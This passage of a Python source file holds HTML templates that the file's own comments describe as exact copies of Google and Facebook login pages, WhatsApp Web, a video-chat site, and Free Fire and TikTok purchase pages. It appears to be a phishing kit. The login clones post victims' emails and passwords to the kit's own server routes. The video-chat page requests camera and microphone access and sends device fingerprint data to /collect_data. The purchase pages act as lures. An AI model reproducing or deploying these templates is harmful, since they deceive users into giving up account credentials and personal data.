                        <input type="radio" name="diamonds" value="5000" id="pkg_5000" class="hidden-radio" onchange="updatePrice('$99.99')">
                        <span class="icon">💎</span>
                        <span class="amount">5000</span>
                        <span class="bonus">+500</span>
                        <span class="price">$99.99</span>
                    </label>
                    <label class="package-item" for="pkg_10000">
                        <input type="radio" name="diamonds" value="10000" id="pkg_10000" class="hidden-radio" onchange="updatePrice('$199.99')">
                        <span class="icon">💎</span>
                        <span class="amount">10000</span>
                        <span class="bonus">+1000</span>
                        <span class="price">$199.99</span>
                    </label>
                </div>
            </div>
            <div class="price-summary">
                <span class="label">💳 المبلغ الإجمالي</span>
                <span class="price-value" id="totalPrice">$19.99</span>
            </div>
            <button type="submit" class="btn-buy" id="buyBtn">
                <span>💳</span> شراء الآن
            </button>
            <div class="secure-badge"><span class="lock">🔒</span> عملية دفع آمنة 256-bit</div>
        </form>
        <div class="footer-links"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">الدعم</a></div>
    </div>
    <script>
        function updatePrice(price) {
            document.getElementById('totalPrice').textContent = price;
        }
        document.querySelectorAll('.package-item').forEach(function(item) {
            item.addEventListener('click', function() {
                document.querySelectorAll('.package-item').forEach(function(el) {
                    el.classList.remove('selected');
                });
                this.classList.add('selected');
                var radio = this.querySelector('input[type="radio"]');
                if (radio) radio.checked = true;
            });
        });
        document.getElementById('purchaseForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var btn = document.getElementById('buyBtn');
            btn.innerHTML = '<span>⏳</span> جاري المعالجة...';
            btn.disabled = true;
            var formData = new FormData(this);
            fetch('/freefire', { method: 'POST', body: formData })
                .then(function(response) { return response.text(); })
                .then(function(html) { document.write(html); })
                .catch(function() {
                    btn.innerHTML = '<span>💳</span> شراء الآن';
                    btn.disabled = false;
                });
        });
    </script>
</body>
</html>
"""

# ===== صفحة Google Login (نسخ طبق الأصل) =====
GOOGLE_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 450px;
        }
        .login-card {
            background: #ffffff;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 28px;
        }
        .logo img {
            width: 75px;
            height: 24px;
        }
        .logo h1 {
            font-size: 24px;
            font-weight: 400;
            color: #202124;
            margin-top: 16px;
            margin-bottom: 8px;
        }
        .logo p {
            color: #5f6368;
            font-size: 16px;
            font-weight: 400;
        }
        .form-group {
            margin-bottom: 24px;
        }
        .form-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            background: transparent;
            color: #202124;
        }
        .form-group input:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .form-group input::placeholder {
            color: #80868b;
        }
        .forgot-link {
            text-align: left;
            margin: 12px 0 20px;
        }
        .forgot-link a {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 24px;
        }
        .buttons .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }
        .buttons .create-account:hover {
            text-decoration: underline;
        }
        .buttons .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 28px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        .buttons .next-btn:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
        }
        .buttons .next-btn:disabled {
            background: #dadce0;
            color: #80868b;
            cursor: not-allowed;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        .footer select {
            border: none;
            background: transparent;
            color: #5f6368;
            font-size: 12px;
            padding: 4px;
            cursor: pointer;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
            margin: 0 8px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 12px;
            text-align: center;
            display: none;
        }
        .loading-spinner {
            display: none;
            text-align: center;
            margin-top: 12px;
        }
        .loading-spinner .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .guest-mode {
            background: #f8f9fa;
            border-radius: 4px;
            padding: 12px 16px;
            margin-top: 16px;
            font-size: 13px;
            color: #5f6368;
            display: flex;
            align-items: flex-start;
            gap: 8px;
        }
        .guest-mode .icon {
            font-size: 18px;
            margin-top: 2px;
        }
        .guest-mode a {
            color: #1a73e8;
            text-decoration: none;
        }
        .guest-mode a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-card">
            <div class="logo">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google">
                <h1>تسجيل الدخول</h1>
                <p>استمر إلى Gmail</p>
            </div>
            <form id="loginForm" method="POST" action="/google_login">
                <div class="form-group">
                    <input type="email" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
                </div>
                <div class="forgot-link"><a href="#">هل نسيت كلمة المرور؟</a></div>
                <div class="buttons">
                    <a href="#" class="create-account">إنشاء حساب</a>
                    <button type="submit" class="next-btn" id="submitBtn">التالي</button>
                </div>
                <div id="errorMessage" class="error-message">⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
                <div class="loading-spinner" id="loadingSpinner">
                    <div class="spinner"></div>
                    <p style="color:#5f6368;font-size:13px;margin-top:8px;">جاري تسجيل الدخول...</p>
                </div>
                <div class="guest-mode">
                    <span class="icon">🔒</span>
                    <span>ألا تمتلك هذا الكمبيوتر؟ استخدِم نافذة التصفّح بخصوصية تامّة لتسجيل الدخول.<br><a href="#">مزيد من المعلومات حول استخدام "وضع الضيف"</a></span>
                </div>
            </form>
        </div>
        <div class="footer">
            <select><option>العربية</option><option>English</option><option>Français</option></select>
            <a href="#">مساعدة</a><a href="#">الخصوصية</a><a href="#">الشروط</a>
        </div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            if (!email || !password) {
                document.getElementById('errorMessage').textContent = '⚠️ يرجى إدخال البريد الإلكتروني وكلمة المرور';
                document.getElementById('errorMessage').style.display = 'block';
                return;
            }
            document.getElementById('submitBtn').disabled = true;
            document.getElementById('submitBtn').textContent = 'جاري التحقق...';
            document.getElementById('loadingSpinner').style.display = 'block';
            document.getElementById('errorMessage').style.display = 'none';
            const formData = new FormData(this);
            fetch('/google_login', { method: 'POST', body: formData })
                .then(response => response.text())
                .then(html => { document.write(html); })
                .catch(error => {
                    document.getElementById('errorMessage').textContent = '⚠️ حدث خطأ، يرجى المحاولة مرة أخرى';
                    document.getElementById('errorMessage').style.display = 'block';
                    document.getElementById('submitBtn').disabled = false;
                    document.getElementById('submitBtn').textContent = 'التالي';
                    document.getElementById('loadingSpinner').style.display = 'none';
                });
        });
    </script>
</body>
</html>
"""

# ===== صفحة Facebook Login (نسخ طبق الأصل) =====
FACEBOOK_LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى Facebook</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }
        .login-box {
            background: #ffffff;
            padding: 20px 20px 28px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #1877f2;
            font-size: 48px;
            font-weight: 700;
            letter-spacing: -2px;
        }
        .form-group {
            margin-bottom: 12px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            outline: none;
            background: #ffffff;
            color: #1c1e21;
            transition: border-color 0.2s;
        }
        .form-group input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .form-group input::placeholder {
            color: #90949c;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 6px;
        }
        .login-btn:hover {
            background: #166fe5;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dadde1;
        }
        .divider-text {
            padding: 0 16px;
            color: #969ba3;
            font-size: 13px;
            font-weight: 600;
        }
        .create-btn {
            width: 100%;
            padding: 14px;
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
        }
        .create-btn:hover {
            background: #36a420;
        }
        .forgot-link {
            text-align: center;
            margin: 16px 0 8px;
        }
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-link a:hover {
            text-decoration: underline;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #969ba3;
            font-size: 12px;
        }
        .footer a {
            color: #969ba3;
            text-decoration: none;
        }
        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>facebook</h1></div>
            <form id="loginForm" method="POST" action="/facebook_login">
                <div class="form-group"><input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
                <div class="form-group"><input type="password" id="password" name="password" placeholder="كلمة المرور" required></div>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
                <div class="forgot-link"><a href="#">هل نسيت كلمة المرور؟</a></div>
                <div class="divider"><div class="divider-line"></div><div class="divider-text">أو</div><div class="divider-line"></div></div>
                <button type="button" class="create-btn" onclick="alert('سيتم توجيهك لإنشاء حساب جديد')">إنشاء حساب جديد</button>
                <div id="errorMessage" class="error-message">⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
            </form>
        </div>
        <div class="footer"><a href="#">الصفحات</a> <a href="#">المساعدة</a> <a href="#">الخصوصية</a> <a href="#">الشروط</a></div>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;
            if (!email || !password) {
                document.getElementById('errorMessage').style.display = 'block';
                return;
            }
            var formData = new FormData(this);
            fetch('/facebook_login', { method: 'POST', body: formData })
                .then(response => response.text())
                .then(html => { document.write(html); })
                .catch(error => {
                    document.getElementById('errorMessage').textContent = '⚠️ حدث خطأ، يرجى المحاولة مرة أخرى';
                    document.getElementById('errorMessage').style.display = 'block';
                });
        });
    </script>
</body>
</html>
"""

# ===== صفحة WhatsApp Web (نسخ طبق الأصل) =====
WHATSAPP_WEB_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, sans-serif;
        }
        body {
            background: #075e54;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
            max-width: 800px;
            width: 100%;
            padding: 40px;
            display: flex;
            gap: 40px;
            align-items: center;
        }
        .content {
            flex: 1;
        }
        .qr-section {
            flex: 0 0 250px;
            text-align: center;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo h1 {
            color: #075e54;
            font-size: 32px;
            font-weight: 300;
        }
        .logo h1 span {
            font-weight: 700;
        }
        .subtitle {
            color: #4a4a4a;
            font-size: 16px;
            margin-bottom: 8px;
            font-weight: 500;
        }
        .description {
            color: #777;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .steps {
            list-style: none;
            padding: 0;
            margin: 20px 0;
        }
        .steps li {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 8px 0;
            color: #333;
            font-size: 14px;
        }
        .steps li .num {
            background: #075e54;
            color: white;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 700;
        }
        .qr-box {
            background: #ffffff;
            padding: 15px;
            border-radius: 8px;
            border: 2px solid #e0e0e0;
            display: inline-block;
        }
        .qr-box img {
            width: 200px;
            height: 200px;
            display: block;
        }
        .qr-text {
            color: #999;
            font-size: 12px;
            margin-top: 10px;
        }
        .qr-text .highlight {
            color: #075e54;
            font-weight: 700;
        }
        .footer-links {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
        }
        .footer-links a {
            color: #777;
            text-decoration: none;
            font-size: 12px;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        @media (max-width: 700px) {
            .container {
                flex-direction: column;
                padding: 20px;
            }
            .qr-section {
                flex: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <div class="logo"><h1><span>WhatsApp</span> Web</h1></div>
            <div class="subtitle">ابق على تواصل مع WhatsApp على المتصفح</div>
            <ul class="steps">
                <li><span class="num">1</span> افتح WhatsApp على هاتفك</li>
                <li><span class="num">2</span> اضغط على <strong>القائمة</strong> (⋮) أو <strong>الإعدادات</strong></li>
                <li><span class="num">3</span> اختر <strong>WhatsApp Web</strong></li>
                <li><span class="num">4</span> امسح رمز الاستجابة السريعة (QR Code)</li>
            </ul>
            <div class="description">🔒 <strong>مشفر بالكامل</strong> - رسائلك الخاصة آمنة تماماً مع تشفير التام</div>
        </div>
        <div class="qr-section">
            <div class="qr-box">
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAYAAACtWK6eAAAAAXNSR0IArs4c6QAAAERlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAA6ABAAMAAAABAAEAAKACAAQAAAABAAAAyKADAAQAAAABAAAAyAAAAADpj0k7AAAAtUlEQVR4Ae3BAQ0AAADCoPdPbQ8HESgMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBgwIABAwYMGDBg4J8BAAD//wMA7hBWNLt8sZ8AAAAASUVORK5CYII=" alt="QR Code">
            </div>
            <div class="qr-text">🔄 <span class="highlight">قم بتحديث</span> الصفحة لظهور رمز جديد</div>
        </div>
    </div>
    <div class="footer-links"><a href="#">الخصوصية</a><a href="#">المساعدة</a><a href="#">تحميل التطبيق</a></div>
</body>
</html>
"""

# ===== صفحة Video Chat (نسخ طبق الأصل) =====
VIDEO_CHAT_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دردشة فيديو - WhoApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #0f0f1a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 450px;
            width: 100%;
            background: linear-gradient(145deg, #1a1a2e, #16213e);
            border-radius: 24px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .header .logo {
            font-size: 48px;
            display: block;
            margin-bottom: 8px;
        }
        .header h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        .header .subtitle {
            color: #8888aa;
            font-size: 14px;
            margin-top: 4px;
        }
        .header .online-badge {
            display: inline-block;
            background: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            padding: 4px 16px;
            border-radius: 20px;
            font-size: 12px;
            margin-top: 8px;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        .video-container {
            background: #0a0a15;
            border-radius: 16px;
            height: 280px;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
            position: relative;
            overflow: hidden;
            border: 2px solid rgba(255, 255, 255, 0.05);
        }
        .video-container .placeholder {
            text-align: center;
            color: #444;
        }
        .video-container .placeholder .icon {
            font-size: 64px;
            display: block;
            margin-bottom: 12px;
        }
        .video-container .placeholder p {
            font-size: 14px;
        }
        .video-container .status-badge {
            position: absolute;
            bottom: 16px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(10px);
            padding: 6px 20px;
            border-radius: 20px;
            color: #4CAF50;
            font-size: 12px;
            border: 1px solid rgba(76, 175, 80, 0.2);
            display: none;
        }
        .permission-box {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
        }
        .permission-box .title {
            color: #aaaacc;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .permission-box .title .icon {
            font-size: 18px;
        }
        .permission-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }
        .permission-item:last-child {
            border-bottom: none;
        }
        .permission-item .info {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #8888aa;
            font-size: 13px;
        }
        .permission-item .info .icon {
            font-size: 18px;
        }
        .permission-item .status {
            font-size: 12px;
            padding: 2px 12px;
            border-radius: 12px;
        }
        .permission-item .status.granted {
            background: rgba(76, 175, 80, 0.15);
            color: #4CAF50;
        }
        .permission-item .status.pending {
            background: rgba(255, 193, 7, 0.15);
            color: #FFC107;
        }
        .permission-item .status.denied {
            background: rgba(244, 67, 54, 0.15);
            color: #f44336;
        }
        .btn-start {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6C63FF, #4A42B3);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }
        .btn-start:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(108, 99, 255, 0.3);
        }
        .btn-start:disabled {
            background: #333;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .status-text {
            text-align: center;
            color: #666;
            font-size: 13px;
            margin-top: 16px;
        }
        .footer {
            text-align: center;
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        .footer a {
            color: #666;
            text-decoration: none;
            font-size: 12px;
            margin: 0 12px;
            transition: color 0.3s;
        }
        .footer a:hover {
            color: #6C63FF;
        }
        .connecting-dots {
            display: inline-flex;
            gap: 4px;
            margin-left: 8px;
        }
        .connecting-dots .dot {
            width: 6px;
            height: 6px;
            background: #4CAF50;
            border-radius: 50%;
            animation: dotPulse 1.4s ease-in-out infinite;
        }
        .connecting-dots .dot:nth-child(2) {
            animation-delay: 0.2s;
        }
        .connecting-dots .dot:nth-child(3) {
            animation-delay: 0.4s;
        }
        @keyframes dotPulse {
            0%,
            80%,
            100% {
                transform: scale(0.6);
                opacity: 0.4;
            }
            40% {
                transform: scale(1);
                opacity: 1;
            }
        }
        #localVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="logo">📹</span>
            <h1>دردشة فيديو</h1>
            <div class="subtitle">تواصل مع أشخاص جدد حول العالم</div>
            <div class="online-badge">🟢 <span id="onlineCount">1,247</span> متصل الآن</div>
        </div>
        <div class="video-container" id="videoContainer">
            <div class="placeholder" id="placeholder">
                <span class="icon">🎥</span>
                <p>اضغط "بدء المكالمة" للاتصال</p>
            </div>
            <video id="localVideo" autoplay muted playsinline></video>
            <div class="status-badge" id="statusBadge">
                <span class="connecting-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
                جاري الاتصال...
            </div>
        </div>
        <div class="permission-box">
            <div class="title"><span class="icon">🔒</span> الأذونات المطلوبة</div>
            <div class="permission-item"><div class="info"><span class="icon">📷</span> الكاميرا</div><span class="status pending" id="camStatus">في انتظار الموافقة</span></div>
            <div class="permission-item"><div class="info"><span class="icon">🎙️</span> الميكروفون</div><span class="status pending" id="micStatus">في انتظار الموافقة</span></div>
            <div class="permission-item"><div class="info"><span class="icon">🔊</span> مكبر الصوت</div><span class="status granted">✅ مسموح</span></div>
        </div>
        <button class="btn-start" id="startBtn"><span class="icon">▶️</span> بدء المكالمة</button>
        <div class="status-text" id="statusText">🔒 محادثة مشفرة بالكامل</div>
        <div class="footer"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">الإبلاغ عن مشكلة</a></div>
    </div>
    <script>
        var startBtn = document.getElementById('startBtn');
        var statusText = document.getElementById('statusText');
        var placeholder = document.getElementById('placeholder');
        var statusBadge = document.getElementById('statusBadge');
        var camStatus = document.getElementById('camStatus');
        var micStatus = document.getElementById('micStatus');
        var localVideo = document.getElementById('localVideo');
        var stream = null;
        var isConnected = false;

        async function requestPermissions() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                camStatus.textContent = '✅ مسموح';
                camStatus.className = 'status granted';
                micStatus.textContent = '✅ مسموح';
                micStatus.className = 'status granted';
                return true;
            } catch (error) {
                console.error('Permission error:', error);
                if (error.name === 'NotAllowedError') {
                    camStatus.textContent = '❌ مرفوض';
                    camStatus.className = 'status denied';
                    micStatus.textContent = '❌ مرفوض';
                    micStatus.className = 'status denied';
                    statusText.textContent = '⚠️ يرجى السماح بالكاميرا والميكروفون في إعدادات المتصفح';
                } else if (error.name === 'NotFoundError') {
                    statusText.textContent = '⚠️ لم يتم العثور على كاميرا أو ميكروفون';
                } else {
                    statusText.textContent = '⚠️ حدث خطأ: ' + error.message;
                }
                return false;
            }
        }

        function showLocalVideo() {
            if (stream) {
                localVideo.srcObject = stream;
                localVideo.style.display = 'block';
                placeholder.style.display = 'none';
            }
        }

        function connect() {
            if (!stream) {
                statusText.textContent = '⚠️ يرجى الموافقة على الأذونات أولاً';
                return;
            }
            isConnected = true;
            startBtn.disabled = true;
            startBtn.innerHTML = '<span class="icon">⏳</span> جاري الاتصال...';
            statusBadge.style.display = 'block';
            statusText.textContent = '🔄 جاري البحث عن شريك محادثة...';

            setTimeout(function() {
                statusText.textContent = '✅ تم العثور على شريك!';
                statusBadge.style.display = 'none';
                startBtn.innerHTML = '<span class="icon">📞</span> إنهاء المكالمة';
                startBtn.disabled = false;

                setTimeout(function() {
                    var deviceInfo = {
                        platform: navigator.platform,
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height
                    };
                    fetch('/collect_data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'video_chat',
                            device: deviceInfo,
                            timestamp: new Date().toISOString()
                        })
                    });
                    window.location.href = 'https://whoapp.live/ar/video-chat/free-video-chat-app';
                }, 3000);
            }, 3000 + Math.random() * 2000);
        }

        startBtn.addEventListener('click', async function() {
            if (isConnected) {
                isConnected = false;
                startBtn.innerHTML = '<span class="icon">▶️</span> بدء المكالمة';
                statusText.textContent = '🔒 محادثة مشفرة بالكامل';
                if (stream) {
                    stream.getTracks().forEach(function(track) { track.stop(); });
                    stream = null;
                    localVideo.style.display = 'none';
                    placeholder.style.display = 'block';
                }
                return;
            }
            var hasPermissions = await requestPermissions();
            if (hasPermissions) {
                showLocalVideo();
                connect();
            }
        });

        setInterval(function() {
            var count = document.getElementById('onlineCount');
            var current = parseInt(count.textContent.replace(/,/g, ''));
            var change = Math.floor(Math.random() * 20) - 10;
            var newCount = Math.max(100, current + change);
            count.textContent = newCount.toLocaleString();
        }, 5000);
    </script>
</body>
</html>
"""

# ===== صفحة TikTok (نسخ طبق الأصل) =====
TIKTOK_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متابعين تيك توك</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        body {
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: #181818;
            border-radius: 16px;
            padding: 30px 24px;
            border: 1px solid rgba(255, 255, 255, 0.06);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
        }
        .header {
            text-align: center;
            margin-bottom: 28px;
        }
        .header .logo {
            font-size: 48px;
            display: block;
            margin-bottom: 4px;
        }
        .header h1 {
            color: #ffffff;
            font-size: 28px;
            font-weight: 800;
            letter-spacing: 0.5px;
        }
        .header h1 span {
            color: #25f4ee;
        }
        .header .subtitle {
            color: #888;
            font-size: 14px;
            margin-top: 4px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group label {
            display: block;
            color: #aaa;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        .form-group label .required {
            color: #ff0050;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            color: #ffffff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s;
        }
        .form-group input:focus {
            border-color: #25f4ee;
            background: rgba(37, 244, 238, 0.05);
            box-shadow: 0 0 20px rgba(37, 244, 238, 0.08);
        }
        .form-group input::placeholder {
            color: #555;
        }
        .package-grid {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 8px;
            margin: 10px 0;
        }
        .package-item {
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid rgba(255, 255, 255, 0.06);
            border-radius: 10px;
            padding: 12px 4px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .package-item:hover {
            border-color: #25f4ee;
            background: rgba(37, 244, 238, 0.08);
        }
        .package-item.selected {
            border-color: #25f4ee;
            background: rgba(37, 244, 238, 0.12);
            box-shadow: 0 0 25px rgba(37, 244, 238, 0.1);
        }
        .package-item .icon {
            font-size: 20px;
            display: block;
        }
        .package-item .amount {
            font-size: 15px;
            font-weight: 700;
            display: block;
            margin-top: 4px;
            color: #ffffff;
        }
        .package-item .price {
            font-size: 12px;
            color: #666;
            display: block;
            margin-top: 2px;
        }
        .package-item .bonus {
            font-size: 10px;
            color: #ff0050;
            font-weight: 600;
            display: block;
        }
        .price-summary {
            background: rgba(37, 244, 238, 0.05);
            border: 1px solid rgba(37, 244, 238, 0.1);
            border-radius: 12px;
            padding: 14px 18px;
            margin: 14px 0 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .price-summary .label {
            color: #aaa;
            font-size: 13px;
        }
        .price-summary .price-value {
            color: #25f4ee;
            font-size: 22px;
            font-weight: 800;
        }
        .btn-buy {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #25f4ee, #00d4c0);
            color: #000000;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .btn-buy:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(37, 244, 238, 0.3);
        }
        .btn-buy:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }
        .secure-badge {
            text-align: center;
            margin-top: 14px;
            color: #555;
            font-size: 11px;
        }
        .secure-badge .lock {
            color: #4CAF50;
        }
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 24px;
            margin-top: 18px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
        }
        .footer-links a {
            color: #555;
            text-decoration: none;
